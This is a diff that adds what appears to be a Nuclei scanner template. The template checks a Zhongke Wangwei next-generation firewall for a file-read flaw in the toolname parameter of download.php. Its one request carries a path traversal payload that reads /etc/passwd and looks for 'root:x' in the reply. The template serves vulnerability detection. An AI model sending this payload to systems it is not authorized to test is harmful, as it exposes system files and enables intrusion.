@@ -1,0 +1,20 @@
+id: ZhongkeWangwei-fileRead
+info:
+  name: 中科网威下一代防火墙 download.php 文件 toolname 参数 文件读取漏洞
+  author: Str1am
+  severity: high
+  tags: ZhongkeWangwei,fileRead
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x"
+        part: body
+        condition: and
